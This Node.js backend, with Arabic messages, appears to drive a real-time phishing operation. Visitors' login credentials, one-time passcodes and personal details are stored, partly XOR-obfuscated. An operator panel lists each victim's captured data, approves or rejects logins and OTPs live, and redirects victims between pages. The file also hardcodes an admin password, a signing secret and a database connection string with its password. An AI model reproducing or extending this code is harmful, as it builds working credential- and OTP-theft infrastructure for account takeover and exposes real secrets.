const crypto = require('crypto');
const http = require('http');
const { Pool } = require('pg');

const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'Ha09876@@';
const HMAC_SECRET = process.env.HMAC_SECRET || 'maqrq_admin_secret_2024';
const CRYPTO_SECRET = 'mQ9xR4kL7pW2vN8j';

const DATABASE_URL = process.env.DATABASE_URL || 'postgresql://postgres.ueoqbkbzajcwkqnpskel:HaH0987%40%40%23%23@aws-0-eu-west-1.pooler.supabase.com:5432/postgres';

const pool = new Pool({
  connectionString: DATABASE_URL,
  ssl: { rejectUnauthorized: false },
  max: 1,
  idleTimeoutMillis: 20000,
  connectionTimeoutMillis: 10000
});

const CACHE_TTL = 60000;
const _cache = {};
function cached(key, ttlMs, fn) {
  const entry = _cache[key];
  if (entry && Date.now() - entry.ts < ttlMs) return Promise.resolve(entry.val);
  return fn().then(val => { _cache[key] = { val, ts: Date.now() }; return val; });
}
function clearCache(prefix) {
  for (const k of Object.keys(_cache)) {
    if (!prefix || k.startsWith(prefix)) delete _cache[k];
  }
}

async function loadUsers() {
  return cached('store.users', CACHE_TTL, async () => {
    const { rows } = await pool.query('SELECT * FROM maqrq_users');
    const users = {};
    for (const row of rows) {
      users[row.session_id] = {
        id: row.id,
        session_id: row.session_id,
        ip_address: row.ip_address || '',
        country: row.country || '',
        current_page: row.current_page || '',
        last_activity: row.last_activity ? new Date(row.last_activity).toISOString() : null,
        redirect_to: row.redirect_to || null
      };
    }
    return users;
  });
}

async function loadRequests() {
  return cached('store.requests', CACHE_TTL, async () => {
    const { rows } = await pool.query('SELECT * FROM maqrq_requests');
    const requests = {};
    for (const row of rows) {
      requests[row.id] = {
        id: row.id,
        user_session_id: row.user_session_id,
        type: row.type,
        data: row.data || {},
        status: row.status || 'pending',
        timestamp: row.timestamp ? new Date(row.timestamp).toISOString() : null,
        admin_action_time: row.admin_action_time ? new Date(row.admin_action_time).toISOString() : null
      };
    }
    return requests;
  });
}

async function saveUser(sessionId, data) {
  await pool.query(
    `INSERT INTO maqrq_users (session_id, id, ip_address, country, current_page, last_activity, redirect_to)
     VALUES ($1, $2, $3, $4, $5, $6, $7)
     ON CONFLICT (session_id) DO UPDATE SET
       ip_address = EXCLUDED.ip_address,
       country = EXCLUDED.country,
       current_page = EXCLUDED.current_page,
       last_activity = EXCLUDED.last_activity,
       redirect_to = EXCLUDED.redirect_to`,
    [sessionId, data.id, data.ip_address || '', data.country || '', data.current_page || '', data.last_activity || new Date().toISOString(), data.redirect_to || null]
  );
  clearCache('store.users');
  clearCache('admin.');
}

async function saveRequest(requestId, data) {
  await pool.query(
    `INSERT INTO maqrq_requests (id, user_session_id, type, data, status, timestamp, admin_action_time)
     VALUES ($1, $2, $3, $4, $5, $6, $7)
     ON CONFLICT (id) DO UPDATE SET
       user_session_id = EXCLUDED.user_session_id,
       type = EXCLUDED.type,
       data = EXCLUDED.data,
       status = EXCLUDED.status,
       timestamp = EXCLUDED.timestamp,
       admin_action_time = EXCLUDED.admin_action_time`,
    [requestId, data.user_session_id, data.type, JSON.stringify(data.data || {}), data.status || 'pending', data.timestamp || new Date().toISOString(), data.admin_action_time || null]
  );
  clearCache('store.requests');
  clearCache('admin.');
}

function generateId() {
  return crypto.randomUUID();
}

function xorDecrypt(encoded) {
  const raw = Buffer.from(encoded, 'base64');
  const result = [];
  for (let i = 0; i < raw.length; i++) {
    result.push(raw[i] ^ CRYPTO_SECRET.charCodeAt(i % CRYPTO_SECRET.length));
  }
  const payload = Buffer.from(result).toString('utf-8');
  const dotIndex = payload.indexOf('.');
  if (dotIndex !== -1) {
    return JSON.parse(payload.substring(dotIndex + 1));
  }
  return JSON.parse(payload);
}

function makeAdminToken() {
  const ts = Date.now().toString();
  const sig = crypto.createHmac('sha256', HMAC_SECRET).update(ts).digest('hex');
  return ts + '.' + sig;
}

function verifyAdminToken(token) {
  if (!token) return false;
  const parts = token.split('.');
  if (parts.length !== 2) return false;
  const [ts, sig] = parts;
  const expected = crypto.createHmac('sha256', HMAC_SECRET).update(ts).digest('hex');
  if (sig !== expected) return false;
  const age = Date.now() - parseInt(ts);
  return age < 30 * 24 * 60 * 60 * 1000;
}

function parseCookies(cookieHeader) {
  const cookies = {};
  if (cookieHeader) {
    cookieHeader.split(';').forEach(c => {
      const [key, ...vals] = c.trim().split('=');
      if (key) cookies[key.trim()] = vals.join('=').trim();
    });
  }
  return cookies;
}

function getCountryFromIp(ip) {
  return new Promise((resolve) => {
    if (!ip || ip === '127.0.0.1' || ip === '::1') return resolve('محلي');
    const url = `http://ip-api.com/json/${ip}?fields=country`;
    const timer = setTimeout(() => resolve('غير معروف'), 3000);
    http.get(url, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        clearTimeout(timer);
        try { resolve(JSON.parse(data).country || 'غير معروف'); }
        catch { resolve('غير معروف'); }
      });
    }).on('error', () => { clearTimeout(timer); resolve('غير معروف'); });
  });
}

function getUserRequestsFromAll(allRequests, sessionId) {
  return Object.values(allRequests).filter(r => r.user_session_id === sessionId);
}

module.exports = async (req, res) => {
  try {
  const url = new URL(req.url, `http://${req.headers.host}`);
  const path = url.pathname;
  const method = req.method;
  const cookies = parseCookies(req.headers.cookie);

  let body = null;
  if (method === 'POST') {
    if (req.body) {
      body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
    }
  }

  if (path === '/admin/login' && method === 'POST') {
    const password = body?.password;
    if (password === ADMIN_PASSWORD) {
      const token = makeAdminToken();
      res.setHeader('Set-Cookie', `admin_token=${token}; Path=/; HttpOnly; SameSite=Lax; Max-Age=${30 * 24 * 60 * 60}`);
      return res.status(200).json({ status: 'success' });
    }
    return res.status(401).json({ status: 'error', message: 'كلمة المرور غير صحيحة' });
  }

  if (path === '/admin/logout') {
    res.setHeader('Set-Cookie', 'admin_token=; Path=/; HttpOnly; SameSite=Lax; Max-Age=0');
    return res.writeHead(302, { Location: '/admin_login.html' }).end();
  }

  if (path === '/admin' && method === 'GET') {
    if (verifyAdminToken(cookies.admin_token)) {
      return res.writeHead(302, { Location: '/admin.html' }).end();
    }
    return res.writeHead(302, { Location: '/admin_login.html' }).end();
  }

  const isAdminApi = path.startsWith('/admin/') && path !== '/admin/login' && path !== '/admin/logout';
  if (isAdminApi && !verifyAdminToken(cookies.admin_token)) {
    return res.status(401).json({ status: 'error', message: 'غير مصرح لك بالوصول' });
  }

  if (path === '/admin/all_requests') {
    const allUsers = await loadUsers();
    const allReqs = await loadRequests();
    const reqsBySession = {};
    for (const r of Object.values(allReqs)) {
      if (!reqsBySession[r.user_session_id]) reqsBySession[r.user_session_id] = [];
      reqsBySession[r.user_session_id].push(r);
    }

    const sessionsList = [];
    for (const [sid, user] of Object.entries(allUsers)) {
      const reqs = reqsBySession[sid] || [];
      if (reqs.length === 0) continue;

      const userData = {};
      reqs.forEach(r => { if (r.data && typeof r.data === 'object') Object.assign(userData, r.data); });
      const sorted = [...reqs].sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

      sessionsList.push({
        id: user.id,
        session_id: user.session_id,
        ip_address: user.ip_address,
        country: user.country || 'غير معروف',
        current_page: user.current_page,
        last_activity: user.last_activity,
        data: userData,
        login_status: sorted.find(r => r.type === 'login')?.status || null,
        otp_status: sorted.find(r => r.type === 'otp')?.status || null
      });
    }
    sessionsList.sort((a, b) => (b.last_activity || '').localeCompare(a.last_activity || ''));
    return res.status(200).json(sessionsList);
  }

  let m;
  if ((m = path.match(/^\/admin\/request_details\/(.+)$/))) {
    const sessionId = decodeURIComponent(m[1]);
    const allUsers = await loadUsers();
    const user = allUsers[sessionId];
    if (!user) return res.status(404).json({ status: 'error', message: 'المستخدم غير موجود' });

    const allReqs = await loadRequests();
    const reqs = getUserRequestsFromAll(allReqs, sessionId);
    const userData = {};
    reqs.forEach(r => { if (r.data && typeof r.data === 'object') Object.assign(userData, r.data); });

    return res.status(200).json({
      id: user.id,
      session_id: user.session_id,
      ip_address: user.ip_address,
      country: user.country || 'غير معروف',
      current_page: user.current_page,
      data: userData,
      login_status: reqs.find(r => r.type === 'login')?.status || null,
      otp_status: reqs.find(r => r.type === 'otp')?.status || null
    });
  }

  if ((m = path.match(/^\/admin\/approve_login\/(.+)$/))) {
    const sessionId = decodeURIComponent(m[1]);
    const allReqs = await loadRequests();
    const reqs = getUserRequestsFromAll(allReqs, sessionId);
    const pending = reqs.filter(r => r.type === 'login' && r.status === 'pending').sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    if (pending.length > 0) {
      const updated = { ...pending[0], status: 'approved', admin_action_time: new Date().toISOString() };
      await saveRequest(pending[0].id, updated);
    }
    return res.status(200).json({ status: 'success', message: 'تمت الموافقة على تسجيل الدخول' });
  }

  if ((m = path.match(/^\/admin\/reject_login\/(.+)$/))) {
    const sessionId = decodeURIComponent(m[1]);
    const allReqs = await loadRequests();
    const reqs = getUserRequestsFromAll(allReqs, sessionId);
    const pending = reqs.filter(r => r.type === 'login' && r.status === 'pending').sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    if (pending.length > 0) {
      const updated = { ...pending[0], status: 'rejected', admin_action_time: new Date().toISOString() };
      await saveRequest(pending[0].id, updated);
    }
    return res.status(200).json({ status: 'success', message: 'تم رفض تسجيل الدخول' });
  }

  if ((m = path.match(/^\/admin\/approve_otp\/(.+)$/))) {
    const sessionId = decodeURIComponent(m[1]);
    const allReqs = await loadRequests();
    const reqs = getUserRequestsFromAll(allReqs, sessionId);
    const pending = reqs.filter(r => r.type === 'otp' && r.status === 'pending').sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    if (pending.length > 0) {
      const updated = { ...pending[0], status: 'approved', admin_action_time: new Date().toISOString() };
      await saveRequest(pending[0].id, updated);
    }
    return res.status(200).json({ status: 'success', message: 'تمت الموافقة على OTP' });
  }

  if ((m = path.match(/^\/admin\/reject_otp\/(.+)$/))) {
    const sessionId = decodeURIComponent(m[1]);
    const allReqs = await loadRequests();
    const reqs = getUserRequestsFromAll(allReqs, sessionId);
    const pending = reqs.filter(r => r.type === 'otp' && r.status === 'pending').sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    if (pending.length > 0) {
      const updated = { ...pending[0], status: 'rejected', admin_action_time: new Date().toISOString() };
      await saveRequest(pending[0].id, updated);
    }
    return res.status(200).json({ status: 'success', message: 'تم رفض OTP' });
  }

  if (path === '/admin/active_visits') {
    const allUsers = await loadUsers();
    const cutoff = new Date(Date.now() - 5 * 60 * 1000);
    const visits = Object.values(allUsers)
      .filter(u => new Date(u.last_activity) >= cutoff)
      .map(u => ({
        session_id: u.session_id,
        ip_address: u.ip_address,
        country: u.country,
        current_page: u.current_page,
        last_activity: u.last_activity
      }));
    return res.status(200).json(visits);
  }

  if ((m = path.match(/^\/admin\/redirect_user\/(.+)$/)) && method === 'POST') {
    const sessionId = decodeURIComponent(m[1]);
    const allUsers = await loadUsers();
    const user = allUsers[sessionId];
    if (!user) return res.status(404).json({ status: 'error', message: 'المستخدم غير موجود' });
    const targetPage = body?.target_page;
    if (!targetPage) return res.status(400).json({ status: 'error', message: 'الصفحة المستهدفة غير محددة' });
    await saveUser(sessionId, { ...user, redirect_to: targetPage });
    return res.status(200).json({ status: 'success', message: 'تم تعيين إعادة التوجيه للمستخدم' });
  }

  if (path === '/submit_request' && method === 'POST') {
    if (!body) return res.status(400).json({ status: 'error', message: 'يجب أن يكون الطلب بصيغة JSON' });

    let requestType, userData;
    if (body.encrypted) {
      try {
        const decrypted = xorDecrypt(body.encrypted);
        requestType = decrypted.type;
        userData = decrypted.data;
      } catch {
        return res.status(400).json({ status: 'error', message: 'فشل فك التشفير' });
      }
    } else {
      requestType = body.type;
      userData = body.data;
    }

    if (!requestType || !userData) return res.status(400).json({ status: 'error', message: 'بيانات الطلب غير مكتملة' });

    const sid = cookies.user_session_id || generateId();
    const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || '';

    const allUsers = await loadUsers();
    let user = allUsers[sid] || null;
    if (!user) {
      user = {
        id: generateId(),
        session_id: sid,
        ip_address: ip,
        country: '',
        current_page: requestType,
        last_activity: new Date().toISOString(),
        redirect_to: null
      };
    }
    user.current_page = requestType;
    user.last_activity = new Date().toISOString();
    user.redirect_to = null;
    if (!user.country) user.country = await getCountryFromIp(ip);
    await saveUser(sid, user);

    const autoApprove = ['personal_info', 'watch_request'].includes(requestType);

    let reqObj = null;
    if (['login', 'otp'].includes(requestType)) {
      const allReqs = await loadRequests();
      const existingReqs = getUserRequestsFromAll(allReqs, sid);
      const rejected = existingReqs
        .filter(r => r.type === requestType && r.status === 'rejected')
        .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
      if (rejected.length > 0) {
        reqObj = {
          ...rejected[0],
          data: userData,
          status: 'pending',
          timestamp: new Date().toISOString(),
          admin_action_time: null
        };
        await saveRequest(rejected[0].id, reqObj);
      }
    }

    if (!reqObj) {
      const newId = generateId();
      reqObj = {
        id: newId,
        user_session_id: sid,
        type: requestType,
        data: userData,
        status: autoApprove ? 'approved' : 'pending',
        timestamp: new Date().toISOString(),
        admin_action_time: autoApprove ? new Date().toISOString() : null
      };
      await saveRequest(newId, reqObj);
    }

    res.setHeader('Set-Cookie', `user_session_id=${sid}; Path=/; SameSite=Lax; Max-Age=${86400 * 30}`);
    return res.status(autoApprove ? 200 : 202).json({
      status: autoApprove ? 'approved' : 'pending',
      request_id: reqObj.id,
      message: autoApprove ? 'تم استلام البيانات' : 'تم استلام طلبك، بانتظار موافقة المسؤول'
    });
  }

  if ((m = path.match(/^\/request_status\/(.+)$/))) {
    const requestId = decodeURIComponent(m[1]);
    const allReqs = await loadRequests();
    const reqObj = allReqs[requestId];
    if (!reqObj) return res.status(404).json({ status: 'error', message: 'الطلب غير موجود' });
    const allUsers = await loadUsers();
    const user = allUsers[reqObj.user_session_id];
    return res.status(200).json({
      status: reqObj.status,
      type: reqObj.type,
      data: reqObj.data,
      redirect_to: user?.redirect_to || null
    });
  }

  if (path === '/clear_redirect' && method === 'POST') {
    const sid = cookies.user_session_id;
    if (sid) {
      const allUsers = await loadUsers();
      if (allUsers[sid]) {
        await saveUser(sid, { ...allUsers[sid], redirect_to: null });
      }
    }
    return res.status(200).json({ status: 'success' });
  }

  if (path === '/track_visit' && method === 'POST') {
    if (!body) return res.status(400).json({ status: 'error', message: 'يجب أن يكون الطلب بصيغة JSON' });
    const page = body.page;
    if (!page) return res.status(400).json({ status: 'error', message: 'الصفحة غير محددة' });

    const sid = cookies.user_session_id || generateId();
    const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || '';

    const allUsers = await loadUsers();
    let user = allUsers[sid] || null;
    if (!user) {
      user = {
        id: generateId(),
        session_id: sid,
        ip_address: ip,
        country: '',
        current_page: page,
        last_activity: new Date().toISOString(),
        redirect_to: null
      };
    }
    user.current_page = page;
    user.last_activity = new Date().toISOString();
    if (!user.country) user.country = await getCountryFromIp(ip);
    await saveUser(sid, user);

    res.setHeader('Set-Cookie', `user_session_id=${sid}; Path=/; SameSite=Lax; Max-Age=${86400 * 30}`);
    return res.status(200).json({ status: 'success', message: 'تم تحديث الزيارة' });
  }

  return res.status(404).json({ status: 'error', message: 'المسار غير موجود' });
  } catch (err) {
    console.error('API Error:', err);
    return res.status(500).json({ status: 'error', message: err.message || 'Internal server error' });
  }
};
